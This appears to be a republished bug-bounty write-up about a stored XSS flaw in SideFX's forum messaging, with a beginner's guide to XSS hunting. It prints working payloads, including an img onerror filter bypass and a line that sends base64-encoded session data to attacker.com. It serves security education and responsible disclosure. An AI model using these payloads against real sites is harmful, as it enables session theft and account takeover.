# :globe_with_meridians: The $500 Stored XSS Bug in SideFX’s Messaging System

> **Original Source:** [The $500 Stored XSS Bug in SideFX’s Messaging System](https://infosecwriteups.com/the-500-stored-xss-bug-in-sidefxs-messaging-system-e55e1121d391)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# The $500 Stored XSS Bug in SideFX’s Messaging System


## Hacking the Inbox: How a $500 Stored XSS Bug Exposed SideFX’s Messaging Flaw


In web security, a single tiny bug can cause big trouble. Imagine sending a friendly message on a forum and that message quietly turns into a tool that steals logins. It happened for real on SideFX the community hub for Houdini users. A researcher calling themself itriedallthenamess reported a Stored Cross-Site Scripting (XSS) vulnerability in SideFX’s messaging system. The reward: $500. Not bad for spotting something dangerous.


Don’t worry if you’re new to cybersecurity. This article explains what happened, why it mattered, and how you can find similar bugs yourself. By the end you should feel ready to try bug hunting responsibly.

>

**What is Stored XSS? A Simple Breakdown**


XSS (Cross-Site Scripting) is when an attacker sneaks malicious code into a website so that the code runs in other users’ browsers. Think of it as slipping a fake note into a mailbox that explodes when opened.


There are a few flavors:


- Reflected XSS the payload bounces back immediately (you click a bad link).

- DOM-based XSS client-side code mishandles data and runs the payload.

- Stored XSS the worst one: the malicious code is saved on the server. Anyone who views the stored content executes it. No clicking required.


Stored XSS loves places that accept and show user input: forums, comments, profiles, and private messages. If an app doesn’t properly sanitize input, tags like `<img>` or `<script>` can slip through and run when someone views them.


The SideFX issue was exactly this: user supplied HTML in messages wasn’t escaped so payloads were stored and executed when viewed.

>

**How the Researcher Found It**


This was curiosity + persistence. The hunter (itriedallthenamess) poked around SideFX’s forum and messaging a place where only approved accounts could message each other. Even with that gate the messaging feature accepted HTML in a way it shouldn’t have.


They first posted safely on the forum, then started sending test messages to their own accounts. One simple test proved the problem: an intentionally broken image tag that triggers `onerror`.


Example simple payload:


```
<img src="xx" onerror="alert('XSS')">
```


When the browser failed to load `xx`, the `onerror` ran an alert popped up. Proof of concept achieved.


They went further to show real impact. Using the victim’s session, their payload fetched `/account/sessions/`, base64-encoded the response and exfiltrated it via an image request:


```
<img src="http://attacker.com?q={BASE64_HTML}">
```


Because the site exposed session info and the page allowed it to be fetched from the browser context the attacker could steal a session token and impersonate the user. That’s a full account takeover.


The root cause: message content wasn’t sanitized/escaped. Tags like `<img>` were stored and rendered without neutralization.

>

**Reproducing the Bug**


Only test on systems you own or have permission to test. For learning, use labs like PortSwigger’s Web Security Academy.


How it was reproduced (simplified):


- Get an approved SideFX account (messaging access).

- Send a message containing a crafted payload:


```
Check this link: https://example.com/"&gtsadf<a><img src="xx" onerror="alert('XSS')">
```


The odd quoting and tags bypassed filters.


3. Log in as the receiver — open the message — the alert runs.


4. Advanced: replace `alert()` with a `fetch()` that reads `/account/sessions`, base64 encodes it and leaks it to an external server via a hidden `<img>`.


Tools that help: Burp Suite, browser DevTools and payload lists like PayloadsAllTheThings. Encoding payloads (URL-encoding, `btoa`, or entity encoding) helps bypass filters.


## Get Monika sharma’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


SideFX patched it quickly but the report is a great case study.

>

**Why This Bug Was Dangerous**


A $500 bounty may look modest but the impact was big:


- Session theft: account takeover, private project exposure.

- Mass infection: a single stored payload can hit many users.

- Data leaks: personal files, messages or API keys might be exposed.

- Reputation damage: users lose trust in the platform.


OWASP still lists XSS as a common risk; bug-bounty platforms report XSS regularly. It’s not gone it just changes shape.

>

**The $500 Bounty — Why That Amount?**


Bounty sizes vary. SideFX paid $500 ([1669764](https://hackerone.com/reports/1669764)) here because the bug was serious but scoped to messaging not a full remote code execution across the whole site. On bigger programs similar bugs can fetch much higher rewards sometimes thousands of dollars. For many hunters even small payouts add up.

### **How You Can Hunt for Stored XSS — A Beginner’s Playbook**


Ready to hunt? Here’s a practical and ethical roadmap.


Step 1: Tools (free and essential)


- Browser DevTools (F12)

- Burp Suite Community (intercept & modify)

- Payload lists: PayloadsAllTheThings

- Labs: PortSwigger Web Security Academy (XSS exercises)


Step 2: Choose Targets Carefully


- Forums, comments, messages, profile fields, file uploads.

- Only test in scope targets on bounty programs or in your own lab.


Step 3: Test Smart


- Try payloads in every input you control.

- Start simple:


```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```


- Then try bypasses: URL-encoding, entity encoding, nested tags or breaking attributes.

- Always check if the payload gets stored and executed when viewed by another user.


Step 4: Prove Impact


- Screenshots or short videos of the alert executing.

- PoC that shows exfiltration (to a webhook.site or your controlled server).

- Explain the chain: “Stored XSS → session leak → account takeover” with steps.


Step 5: Report Nicely


- Clear title: “Stored XSS in Messaging via Unsanitized HTML”

- Repro steps, PoC, impact, suggested fix (escape or sanitize output, use CSP).

- Be polite — helpful reports get faster fixes and better responses.

>

**Pitfalls & Ethics**


- Don’t test outside scope.

- Avoid destructive tests.

- Use test accounts and rate-limit yourself.

- False positives happen test in incognito or clean profiles.

### Final Thoughts — Why This Matters


This bug was found not by luck, but by persistence. The researcher tried different inputs until something clicked. That’s how many vulnerabilities are found. If you like digging and thinking like an attacker bug hunting can be rewarding both intellectually and financially.


Start with labs, practice XSS chains, and then try small bounty programs. Share findings responsibly (and follow disclosure rules). Who knows your first $100 bug could turn into much more.

>

***Follow me on X: ***[https://x.com/Commanak46](https://x.com/Commanak46)

---

*Originally published on [Medium](https://infosecwriteups.com/the-500-stored-xss-bug-in-sidefxs-messaging-system-e55e1121d391). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
